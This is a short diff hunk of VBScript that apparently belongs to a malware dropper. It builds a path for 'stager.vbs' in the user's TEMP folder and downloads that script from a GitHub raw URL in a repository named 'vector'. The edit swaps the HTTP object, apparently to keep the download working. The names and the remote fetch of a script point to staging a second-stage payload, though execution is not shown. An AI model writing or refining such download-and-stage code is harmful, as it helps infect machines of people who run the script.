@@ -20,7 +20,7 @@
       tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
 
       ' 2) Download stager.vbs via XMLHTTP
-      Set xhr = CreateObject("MSXML2.XMLHTTP")
+      Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
       xhr.Open "GET", "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs", False
       xhr.Send
 
